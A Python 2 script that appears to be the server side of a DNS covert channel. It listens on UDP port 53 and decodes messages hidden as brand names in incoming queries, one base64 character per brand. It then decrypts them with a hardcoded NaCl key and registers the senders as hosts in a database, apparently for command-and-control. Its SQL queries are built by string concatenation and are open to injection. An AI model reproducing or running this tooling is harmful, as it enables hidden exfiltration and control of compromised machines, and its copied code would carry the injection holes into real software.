import sys
import socket
from datetime import datetime
import nacl.secret
import nacl.utils
import base64
import psycopg2
from threading import Thread


def postsqlg():
	conn = None
	try:
		conn = psycopg2.connect(host="localhost",database="temp", user="postgres", password=str(sys.argv[1]))
		cur = conn.cursor()
		cur.execute(""" SELECT host FROM data""")
		rows = cur.fetchall()
		cur.close()
		conn.commit()
	except (Exception, psycopg2.DatabaseError) as error:
		print(error)
	finally:
		if conn is not None:
			conn.close()
	return rows


def postsql(hostname):
	conn = None
	try:
		conn = psycopg2.connect(host="localhost",database="bf", user="postgres", password=str(sys.argv[1]))
		bleh = "INSERT INTO hosts(host,stamp,lastcom) VALUES ('" + hostname + "','" + str(datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")) + "'," + "'2011-01-01 00:00:00');"
		cur = conn.cursor()
		cur.execute(bleh)
		cur.close()
		conn.commit()
	except (Exception, psycopg2.DatabaseError) as error:
		print(error)
	finally:
		if conn is not None:
			conn.close()



def srv():
	HOST = str(sys.argv[2])
	PORT = 53

	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	try:
		s.bind((HOST, PORT))
	except socket.error as msg:
		print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
		sys.exit()

	while 1:
		data, addr = s.recvfrom(1024)
		if data != "":
			t = Thread(target=process(data))
			t.start()
		else:
			pass
		#process(data)

	s.close()


def process(data):
	
	ff = ":".join("{:02x}".format(ord(c)) for c in data)
	fe = ff.split(":")
	host = str(fe[0]) + str(fe[1])
	fw = ""
	cid = ""
	uids = postsqlg()
	known = 0
	for x in uids:
		if host in x:
			conn = None		
			conn = psycopg2.connect(host="localhost",database="temp", user="postgres", password=str(sys.argv[1]))
			cur = conn.cursor()
			cid = host
			cur.execute("SELECT what FROM data WHERE host = '" + cid + "'")
			rows = cur.fetchall()
			ff = str(rows)
			fg = ff.replace(")","")
			fd = fg.replace("(","")
			fh = fd.replace(",","")
			fs = fh.replace("'","")
			fq = fs.replace("[","")
			fw = fq.replace("]","")
			cur.close()
			conn.commit()
			known = 1

	
	if "last" in data:
		key = "\xab\xd2\xe5\x86\x84\xdb\xfb\xf7\x9c\x37\x1a\xab\x20\x9a\x3e\x1d\x5a\xf8\xcd\xf3\x74\xc0\x4b\x17\x9a\x2d\x8b\xdc\x20\x5a\x4d\xd1" 
		box = nacl.secret.SecretBox(key)
		ff = str(fw)
		print ff
		try:
			stuff = base64.b64decode(bytes(ff))
		except:
			f = open("error.log","a")
			f.write(str(host) + "\n")
			f.close()
			print "Base54 Decrypt Fail - " + str(host)
		try:
			plaintext = box.decrypt(stuff)
		except:
			f = open("error.log","a")
			f.write(str(host) + "\n")
			f.close()
			print "SHA256 Decrypt Fail - " + str(host)
		print str(host) + " - " + plaintext + " - " + str(datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"))
		postsql(plaintext)
		#print "Decrypt Fail - " + str(host) + " Already exists?"
		known = 0

	if known == 1:
		conn = None		
		conn = psycopg2.connect(host="localhost",database="temp", user="postgres", password=str(sys.argv[1]))
		cur = conn.cursor()
		sad = ""
		if "lycos" in str(data):
			sad = "A"
		if "aa" in str(data):
			sad = "B"
		if "reddit" in str(data):
			sad = "C"
		if "ibm" in str(data):
			sad = "D"
		if "microsoft" in str(data):
			sad = "E"
		if "virgin" in str(data):
			sad = "F"
		if "adobe" in str(data):
			sad = "G"
		if "citrix" in str(data):
			sad = "H"
		if "honda" in str(data):
			sad = "I"
		if "bing" in str(data):
			sad = "J"
		if "qantas" in str(data):
			sad = "K"
		if "asus" in str(data):
			sad = "L"
		if "yahoo" in str(data):
			sad = "M"
		if "zdnet" in str(data):
			sad = "N"
		if "cnet" in str(data):
			sad = "O"
		if "wired" in str(data):
			sad = "P"
		if "twitter" in str(data):
			sad = "Q"
		if "cnn" in str(data):
			sad = "R"
		if "foxnews" in str(data):
			sad = "S"
		if "wikipedia" in str(data):
			sad = "T"
		if "snapchat" in str(data):
			sad = "U"
		if "skype" in str(data):
			sad = "V"
		if "pinterest" in str(data):
			sad = "W"
		if "burgerking" in str(data):
			sad = "X"
		if "nike" in str(data):
			sad = "Y"
		if "valvesoftware" in str(data):
			sad = "Z"
		if "apple" in str(data):
			sad = "a"
		if "shopify" in str(data):
			sad = "b"
		if "spotify" in str(data):
			sad = "c"
		if "amazon" in str(data):
			sad = "d"
		if  "philips" in str(data):
			sad = "e"
		if  "youtube" in str(data):
			sad = "f"
		if  "dominos" in str(data):
			sad = "g"
		if  "linkedin" in str(data):
			sad = "h"
		if  "glassdoor" in str(data):
			sad = "i"
		if  "ebay" in str(data):
			sad = "j"
		if  "craigslist" in str(data):
			sad = "k"
		if  "msn" in str(data):
			sad = "l"
		if  "subway" in str(data):
			sad = "m"
		if  "bbc" in str(data):
			sad = "n"
		if  "netflix" in str(data):
			sad = "o"
		if  "primevideo" in str(data):
			sad = "p"
		if  "time" in str(data):
			sad = "q"
		if  "nissan" in str(data):
			sad = "r"
		if  "nasa" in str(data):
			sad = "s"
		if  "godaddy" in str(data):
			sad = "t"
		if  "adidas" in str(data):
			sad = "u"
		if  "skyscanner" in str(data):
			sad = "v"
		if  "tripadvisor" in str(data):
			sad = "w"
		if  "macys" in str(data):
			sad = "x"
		if  "mcdonalds" in str(data):
			sad = "y"
		if  "nvidia" in str(data):
			sad = "z"
		if  "amd" in str(data):
			sad = "0"
		if  "intel" in str(data):
			sad = "1"
		if  "logitech" in str(data):
			sad = "2"
		if  "ford" in str(data):
			sad = "3"
		if  "dell" in str(data):
			sad = "4"
		if  "hp" in str(data):
			sad = "5"
		if  "htc" in str(data):
			sad = "6"
		if  "sonos" in str(data):
			sad = "7"
		if  "panasonic" in str(data):
			sad = "8"
		if  "jvc" in str(data):
			sad = "9"
		if  "patagonia" in str(data):
			sad = "+"
		if  "sans" in str(data):
			sad = "/"
		if  "birkenstock" in str(data):
			sad = "="	
		fw = fw + sad
		cur.execute("UPDATE data SET what = '" + fw + "' WHERE host='" + cid + "'")
		cur.close()
		conn.commit()
	else:
		pass

			
	if "first" in data:
		if known == 0:
			conn = None
			conn = psycopg2.connect(host="localhost",database="temp", user="postgres", password=str(sys.argv[1]))
			bleh = "INSERT INTO data(host,what) VALUES ('" + host + "','" + ""  + "');"
			cur = conn.cursor()
			cur.execute(bleh)
			cur.close()
			conn.commit()	
	return

if __name__ == "__main__":
	if int(len(sys.argv)) != 3:
		print "Please provide external IP to bind and password for postgres: python server.py password 192.168.0.1"
		sys.exit(1)
	srv()
